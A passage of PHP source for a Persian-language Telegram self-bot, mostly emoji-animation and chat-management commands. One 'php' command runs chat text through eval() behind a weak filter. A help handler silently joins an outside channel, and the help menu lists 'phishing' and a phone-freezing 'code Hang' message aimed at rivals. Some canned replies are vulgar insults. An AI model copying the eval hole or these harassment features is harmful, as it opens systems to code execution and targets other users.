                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'NABINAM DIGE GOHE EZAFE BOKHORIA']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'KOS NANAT GAYIDE SHOD BINAMUS!!! SHOT SHODI BINAMUS!BYE']);
                        $Updates = $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);

                    }
                    if ($text == 'biorandom' or $text == 'بیو شانسی') {
                        $txt = file_get_contents("https://api-smoketm.cf/api/text/txt.php");
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txt]);
                    }

                    if ($text == 'زنبور2' or $text == 'viz2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🏥__________🏃‍♂️______________🐝']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏥______🏃‍♂️_______🐝']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏥______🏃‍♂️_____🐝']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏥___🏃‍♂️___🐝']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '??_🏃‍♂️_🐝']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'در رفت عه☹️🐝']);
                    }


                    if ($text == '/proxy' or $text == 'پروکسی' or $text == 'پروکسی میخوام' or $text == 'proxy bde' or $text == 'prox' or $text == 'پروکس' or $text == 'پروکصی') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "↫↫↫↫↫ ｍ𝐓ρ𝐫ｏ𝓽๏ ρяＯ𝔵Ⓨ 𝓕σг ｔＥㄥ𝓔𝓰я𝓪м ↬↬↬↬↬
  
http://api.codebazan.ir/mtproto/?type=html&channel=ProxyMTProto
↫↫↫↫↫ ｍ𝐓ρ𝐫ｏ𝓽๏ ρяＯ𝔵Ⓨ 𝓕σг ｔＥㄥ𝓔𝓰я𝓪м ↬↬↬↬↬"]);
                    }

                    if ($text == 'زنبور' or $text == 'vizviz') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🏃‍♂😥_______🏃😱😳🚶‍♂________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥_______________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥______________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥_____________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥____________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥___________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥__________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥_________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥________🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥_______🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥______🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥____🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥___🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥__🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🏃‍♂😥_🐝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👨‍🦽😭🥺']);
                    }

                    if ($text == 'قلب' or $text == 'Love') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '💚💚💚💚💚']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛💛💛💛💛']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🧡🧡🧡🧡🧡']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💛💛💛💛💛']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💖💖💖💖💖']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💞💞💞💞💞']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💝💝💝💝💝']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💕💕💕💕💕']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💗💗💗💗💗']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'I love🙂🧡']);
                    }
                    if ($text == 'گوه' or $text == 'goh') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'G']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'O']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'H']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'N']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'A']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'KH']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'O']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'R']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'GOH NAKHOR💩']);
                    }

                    if ($text == 'بمیر کرونا' or $text == 'Corona') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '🦠  •   •   •   •   •   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   •   •   •   •   •   •   ◀  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   •   •   •   •   •   ◀   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   •   •   •   •   ◀   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   •   •   •   ◀   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   •   •   ◀   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   •   ◀   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   •   ◀   •   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   •   ◀   •   •   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  •   ◀   •   •   •   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '🦠  ◀   •   •   •   •   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💥  •   •   •   •   •   •   •   •   •   •  🔫']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '💉💊💉💊💉💊💉💊']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'we wine']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'Corona Is Dead']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'کرونا مورد']);
                    }
                    if ($text == 'انگش' or $text == 'سولاخ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '👌________________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌_______________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌______________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌_____________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌____________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌___________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌__________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌_________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌________👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌_______👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌______👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌____👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌___👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌__👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '👌_👈']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '✌انگشت شد✌']);
                    }

                    if ($text == 'فیل' or $text == 'عشقمی') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
░░▄███▄███▄ 
░░█████████ 
░░▒▀█████▀░ 
░░▒░░▀█▀ 
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
░░▄███▄███▄ 
░░█████████ 
░░▒▀█████▀░ 
░░▒░░▀█▀ 
░░▒░░█░ 
░░▒░█ 
░░░█ 
░░█░░░░███████ 
░██░░░██▓▓███▓██▒ 
██░░░█▓▓▓▓▓▓▓█▓████ 
██░░██▓▓▓(◐)▓█▓█▓█ 
███▓▓▓█▓▓▓▓▓█▓█▓▓▓▓█ 
▀██▓▓█░██▓▓▓▓██▓▓▓▓▓█ 
"]);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
░░▄███▄███▄ 
░░█████████ 
░░▒▀█████▀░ 
░░▒░░▀█▀ 
░░▒░░█░ 
░░▒░█ 
░░░█ 
░░█░░░░███████ 
░██░░░██▓▓███▓██▒ 
██░░░█▓▓▓▓▓▓▓█▓████ 
██░░██▓▓▓(◐)▓█▓█▓█ 
███▓▓▓█▓▓▓▓▓█▓█▓▓▓▓█ 
▀██▓▓█░██▓▓▓▓██▓▓▓▓▓█ 
░▀██▀░░█▓▓▓▓▓▓▓▓▓▓▓▓▓█ 
░░░░▒░░░█▓▓▓▓▓█▓▓▓▓▓▓█ 
░░░░▒░░░█▓▓▓▓█▓█▓▓▓▓▓█ 
░▒░░▒░░░█▓▓▓█▓▓▓█▓▓▓▓█ 
░▒░░▒░░░█▓▓▓█░░░█▓▓▓█ 
░▒░░▒░░██▓██░░░██▓▓██
"]);
                    }

                    if ($text == 'time' or $text == 'ساعت' or $text == 'تایم') {
                        date_default_timezone_set('Asia/Tehran');
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => ';)']);
                        for ($i = 1; $i <= 5; $i++) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => date('H:i:s')]);
                            yield $this->sleep(1);
                        }
                    }

                    if ($text == 'تاریخ شمسی') {
                        $fasl = jdate('f');
                        $month_name = jdate('F');
                        $day_name = jdate('l');
                        $tarikh = jdate('y/n/j');
                        $hour = jdate('H:i:s - a');
                        $animal = jdate('q');
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "امروز  $day_name  |$tarikh|

نام ماه🌙: $month_name

نام فصل ❄️: $fasl

ساعت ⌚️: $hour

نام حیوان امسال : $animal
"]);
                    }

                    if ($text == 'تاریخ میلادی') {
                        date_default_timezone_set('UTC');
                        $rooz = date("l"); // روز
                        $tarikh = date("Y/m/d"); // سال
                        $mah = date("F"); // نام ماه
                        $hour = date('H:i:s - A'); // ساعت
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "today  $rooz |$tarikh|

month name🌙: $mah

time⌚️: $hour"]);
                    }


                    if (preg_match("/^[\/\#\!]?(setanswer) (.*)$/i", $text)) {
                        $ip = trim(str_replace("/setanswer ", "", $text));
                        $ip = explode("|", $ip . "|||||");
                        $txxt = trim($ip[0]);
                        $answeer = trim($ip[1]);
                        if (!isset($data['answering'][$txxt])) {
                            $data['answering'][$txxt] = $answeer;
                            file_put_contents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ɴᴇᴡ ᴡᴏʀᴅ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀɴꜱᴡᴇʀ ʟɪꜱᴛ🏻"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴡᴏʀᴅ ᴀʟʀᴇᴀᴅʏ ᴇxɪꜱᴛꜱ"]);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(php) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(php) (.*)$/i", $text, $a);


                        if (strpos($a[2], '$MadelineProto') === false and strpos($a[2], '$this') === false) {
                            $OutPut = eval("$a[2]");
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "`🔻 $OutPut`", 'parse_mode' => 'markdown']);
                        }
                    }

                    if (preg_match("/^[\/\#\!]?(upload) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(upload) (.*)$/i", $text, $a);
                        $oldtime = time();
                        $link = $a[2];
                        $ch = curl_init($link);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
                        curl_setopt($ch, CURLOPT_HEADER, TRUE);
                        curl_setopt($ch, CURLOPT_NOBODY, TRUE);
                        $data = curl_exec($ch);
                        $size1 = curl_getinfo($ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD);
                        curl_close($ch);
                        $size = round($size1 / 1024 / 1024, 1);
                        if ($size <= 200.9) {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '🌵 Please Wait...
💡 FileSize : ' . $size . 'MB']);
                            $path = parse_url($link, PHP_URL_PATH);
                            $filename = basename($path);
                            copy($link, "files/$filename");
                            yield $this->messages->sendMedia([
                                'peer' => $peer,
                                'media' => [
                                    '_' => 'inputMediaUploadedDocument',
                                    'file' => "files/$filename",
                                    'attributes' => [['_' => 'documentAttributeFilename',
                                        'file_name' => "$filename"]]],
                                'message' => "🔖 Name : $filename
💠 [Your File !]($link)
💡 Size : " . $size . 'MB',
                                'parse_mode' => 'Markdown'
                            ]);
                            $t = time() - $oldtime;
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "✅ ᴜᴘʟᴏᴀᴅᴇᴅ ($t" . 's)']);
                            unlink("files/$filename");
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => '⚠️ خطا : حجم فایل بیشتر از 200 مگ است!']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(delanswer) (.*)$/i", $text)) {
                        preg_match("/^[\/\#\!]?(delanswer) (.*)$/i", $text, $text);
                        $txxt = $text[2];
                        if (isset($data['answering'][$txxt])) {
                            unset($data['answering'][$txxt]);
                            file_put_contents("data.json", json_encode($data));
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜᴇ ᴡᴏʀᴅ ᴡᴀꜱ ʀᴇᴍᴏᴠᴇᴅ ꜰʀᴏᴍ ᴛʜᴇ ᴀɴꜱᴡᴇʀ ʟɪꜱᴛ👌🏻"]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴡᴏʀᴅ ɪꜱ ᴍɪꜱꜱɪɴɢ ɪɴ ᴛʜᴇ ᴀɴꜱᴡᴇʀ ʟɪꜱᴛ :/"]);
                        }
                    }
                    if ($text == '/id' or $text == 'id') {
                        if (isset($message['reply_to_msg_id'])) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                                $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                                $messag = $gms['messages'][0]['from_id'];
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'ʏᴏᴜʀɪᴅ : ' . $messag, 'parse_mode' => 'markdown']);
                            } else {
                                if ($type3 == 'user') {
                                    yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʏᴏᴜʀɪᴅ : `$peer`", 'parse_mode' => 'markdown']);
                                }
                            }
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ɢʀᴏᴜᴘɪᴅ : `$peer`", 'parse_mode' => 'markdown']);
                        }
                    }
                    if (isset($message['reply_to_msg_id'])) {
                        if ($text == 'pin' or $text == '/pin' or $text == 'reza') {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                                $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                                $messag = $gms['messages'][0]['from_id'];
                                $Updates = $this->channels->updatePinnedMessage(['silent' => true, 'channel' => $peer, 'id' => $messag1,]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴘɪɴɴᴇᴅ✅"]);
                            }
                        }
                        if (isset($message['reply_to_msg_id'])) {
                            if ($text == 'unblock' or $text == '/unblock' or $text == '!unblock') {
                                if ($type3 == 'supergroup' or $type3 == 'chat') {
                                    $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                                    $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                                    $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                                    $messag = $gms['messages'][0]['from_id'];
                                    yield $this->contacts->unblock(['id' => $messag]);
                                    yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴜɴʙʟᴏᴄᴋᴇᴅ!"]);
                                } else {
                                    if ($type3 == 'user') {
                                        yield $this->contacts->unblock(['id' => $peer]);
                                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ᴜɴʙʟᴏᴄᴋᴇᴅ!"]);
                                    }
                                }
                            }

                            if ($text == 'block' or $text == '/block' or $text == '!block') {
                                if ($type3 == 'supergroup' or $type3 == 'chat') {
                                    $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                                    $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                                    $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                                    $messag = $gms['messages'][0]['from_id'];
                                    yield $this->contacts->block(['id' => $messag]);
                                    yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʙʟᴏᴄᴋᴇᴅ!"]);
                                } else {
                                    if ($type3 == 'user') {
                                        yield $this->contacts->block(['id' => $peer]);
                                        $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "ʙʟᴏᴄᴋᴇᴅ!"]);
                                    }
                                }
                            }

                            if (preg_match("/^[\/\#\!]?(setenemy) (.*)$/i", $text)) {
                                $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                                $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                                $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                                $messag = $gmsg['messages'][0]['from_id'];
                                if (!in_array($messag, $data['enemies'])) {
                                    $data['enemies'][] = $messag;
                                    file_put_contents("data.json", json_encode($data));
                                    yield $this->contacts->block(['id' => $messag]);
                                    yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$messag ɪꜱ ɴᴏᴡ ɪɴ ᴇɴᴇᴍʏ ʟɪꜱᴛ"]);
                                } else {
                                    yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴜꜱᴇʀ ᴡᴀꜱ ɪɴ ᴇɴᴇᴍʏʟɪꜱᴛ"]);
                                }
                            }
                            if (preg_match("/^[\/\#\!]?(mute) (.*)$/i", $text)) {
                                $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                                $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                                $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                                $messag = $gmsg['messages'][0]['from_id'];
                                if (!in_array($messag, $data['muted'])) {
                                    $data['muted'][] = $messag;
                                    file_put_contents("data.json", json_encode($data));
                                    yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$messag ɪꜱ ɴᴏᴡ ᴍᴜᴛᴇ ʟɪꜱᴛ"]);
                                } else {
                                    yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜᴇ ᴜꜱᴇʀ ᴡᴀꜱ ɪɴ ᴍᴜᴛᴇʟɪꜱᴛ"]);
                                }
                            }
                            if (preg_match("/^[\/\#\!]?(unmute) (.*)$/i", $text)) {
                                $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                                $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                                $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                                $messag = $gmsg['messages'][0]['from_id'];
                                if (in_array($messag, $data['muted'])) {
                                    $k = array_search($messag, $data['muted']);
                                    unset($data['muted'][$k]);
                                    file_put_contents("data.json", json_encode($data));
                                    yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$messag ᴅᴇʟᴇᴛᴇᴅ ꜰʀᴏᴍ ᴍᴜᴛᴇ ʟɪꜱᴛ"]);
                                } else {
                                    yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴜꜱᴇʀ ᴡᴀꜱɴ'ᴛ ɪɴ ᴍᴜᴛᴇ ʟɪꜱᴛ"]);
                                }
                            }
                            if (preg_match("/^[\/\#\!]?(delenemy) (.*)$/i", $text)) {
                                $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                                $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                                $gmsg = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                                $messag = $gmsg['messages'][0]['from_id'];
                                if (in_array($messag, $data['enemies'])) {
                                    $k = array_search($messag, $data['enemies']);
                                    unset($data['enemies'][$k]);
                                    file_put_contents("data.json", json_encode($data));
                                    yield $this->contacts->unblock(['id' => $messag]);
                                    yield $this->messages->sendMessage(['peer' => $peer, 'message' => "$messag ᴅᴇʟᴇᴛᴇᴅ ꜰʀᴏᴍ ᴇɴᴇᴍʏ ʟɪꜱᴛ"]);
                                } else {
                                    yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜɪꜱ ᴜꜱᴇʀ ᴡᴀꜱɴ'ᴛ ɪɴ ᴇɴᴇᴍʏʟɪꜱᴛ"]);
                                }
                            }
                        }
                    }


                    if (preg_match("/^[\/\#\!]?(answerlist)$/i", $text)) {
                        if (count($data['answering']) > 0) {
                            $txxxt = "ʟɪꜱᴛ ᴏꜰ ᴀɴꜱᴡᴇʀꜱ :
";
                            $counter = 1;
                            foreach ($data['answering'] as $k => $ans) {
                                $txxxt .= "$counter: $k => $ans \n";
                                $counter++;
                            }
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txxxt]);
                        } else {
                            yield $this->messages->sendMessage(['peer' => $peer, 'message' => "ᴛʜᴇʀᴇ ɪꜱ ɴᴏ ᴀɴꜱᴡᴇʀ!"]);
                        }
                    }

                    if ($text == 'fun' or $text == 'راهنما سرگرمی') {
                        $load = sys_getloadavg();
                        $mem_using = round(memory_get_usage() / 1024 / 1024, 1);
                        $MadelineProto->channels->joinChannel(['channel' => "@source_kabos"]);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => "
fun help FA
 
بخش سرگرمی ربات❗

🔹️<code>آدم فضایی</code>
آدم فضایی پیدا میکنی👽
⁅———— ◕ ————⁆
🔹️<code>موشک </code>
به سفینه موشک پرت میکنی🚀
⁅———— ◕ ————⁆
🔹️<code>پول</code>
پول آتیش میزنه🔥
⁅———— ◕ ————⁆
🔹️<code>خزوخیل</code>
باکاراش عنت میاد😕
⁅———— ◕ ————⁆
🔹️<code>روح</code>
روحه میترسونش👻
⁅———— ◕ ————⁆
🔹️<code>برم خونه</code>
پیچوندن کسی خیلی حرفه ای😁
⁅———— ◕ ————⁆
🔹️<code>شکست عشقی </code>
عاقبت فرار از خونس😒
⁅———— ◕ ————⁆
🔹️<code>عقاب </code>
عقابه شکارش میکنه🤗
⁅———— ◕ ————⁆
🔹️<code>حموم</code>
درحموم باز میکنی🤣
⁅———— ◕ ————⁆
️ 🔹️<code>آپدیت</code>
سرور آپدیت میشه😶
⁅———— ◕ ————⁆
🔹️<code>بکشش</code>
جنایتکار کشته میشه😝
⁅———— ◕ ————⁆
🔹️<code>خایمال</code>
خایه مالو سگ بگاد😝
⁅———— ◕ ————⁆
🔹️<code>مسجد </code>
پسره میره مسجد📿
⁅———— ◕ ————⁆
🔹️<code>کوسه</code>
کوسه بهش حمله میکنه⛑
⁅———— ◕ ————⁆
🔹️<code>بارون</code>
رعد و برق وبارون🌧
⁅———— ◕ ————⁆
🔹️<code>شب خوش</code>
میخابی🥱
⁅———— ◕ ————⁆
🔹️<code>برم بخابم</code>
میره و میخابه😴
⁅———— ◕ ————⁆
🔹️<code>بادکنک</code>
بت چاقو بادکنک پاره میکنی😆
⁅———— ◕ ————⁆
🔹️<code>فوتبال</code>
توپو میکنه تو دروازه😅
⁅———— ◕ ————⁆
🔹️<code>فیشینگ</code>
phishing💰
⁅———— ◕ ————⁆
🔹️<code>غرقش کن</code>
غرقش میکنه😁
⁅———— ◕ ————⁆
🔹️<code>فضانورد</code>
من میگم ایران قویه🇮🇷
⁅———— ◕ ————⁆
🔹️<code>بزن قدش</code>
میزنین قدش🧤
⁅———— ◕ ————⁆
🔹️<code>عشقمی</code>
یه فیل و یه قلب❤
⁅———— ◕ ————⁆
🔹️<code>شمارش</code>
شمارشش میزنی💫
⁅———— ◕ ————⁆
✨   <code>رقص</code>✨
⁅———— ◕ ————⁆
💗   <code>قلب</code>   💗
⁅———— ◕ ————⁆
❤❤  <code>قلبز</code>  ❤❤
⁅———— ◕ ————⁆
🔳  <code>مکعب</code>   🔳
⁅———— ◕ ————⁆
⬜️  <code>مربع</code>   ⬜️
⁅———— ◕ ————⁆
☢  <code>Corona</code>  ☢
⁅———— ◕ ————⁆
🌵  <code>کاکتوس</code>  🌵
⁅———— ◕ ————⁆
🐝  زنبور یا <code>vizviz</code>  🐝
⚠️ زنبور و انسان بی نوا ❌
⁅———— ◕ ————⁆
 🏎   ماشین یا <code>car </code>  🏎
💥 انفجار ماشین🔥
⁅———— ◕ ————⁆
 🕰 <code>Clock</code>  🕰
⌚️ رقص ساعت ⌚️
⁅———— ◕ ————⁆
  🌡   <code>کورونا</code>   💊
🌡 کورونا اومده💊
⁅———— ◕ ————⁆
🏍  موتور  یا  <code>motor</code>  🏍
🧲  موتور و اهنربا  🧲
⁅———— ◕ ————⁆
 🌤 <code>ابر</code> 🌤
 ⚡️رعد وبرق⚡️
⁅———— ◕ ————⁆
 💞 <code>عشق</code> 💞
 💕نشان دادن عشق??
⁅———— ◕ ————⁆
  💞 <code>عشق دو</code> 💞
 💕 (2) نشان دادن عشق💕
⁅———— ◕ ————⁆
  🟦  <code>moc</code>   🟥
 🟪🔺مکعب های رنگی ریز🔺🟪
⁅———— ◕ ————⁆
 🐓 <code>مرغ</code> 🐓
 🐔 دویدن مرغ 🐔
⁅———— ◕ ————⁆
😎 <code>خودم</code> 😎
😅 نمایی از سیس خودم 😅
⁅———— ◕ ————⁆
🎴 <code>تانک</code> 🎴
⁅———— ◕ ————⁆
👽 <code>هک</code> 👽
⁅———— ◕ ————⁆
💌 <code>love3</code> 💌
⁅———— ◕ ————⁆
🦖 <code>دایناسور</code> 🦖
⁅———— ◕ ————⁆
✨ <code>دهنت سرویس</code> ✨
⁅———— ◕ ————⁆
🎗 <code>هک کردن</code> 🎗
⁅———— ◕ ————⁆
کد هنگ یا <code>code Hang</code>
برای هنگ کردن گوشی بدخواهتون
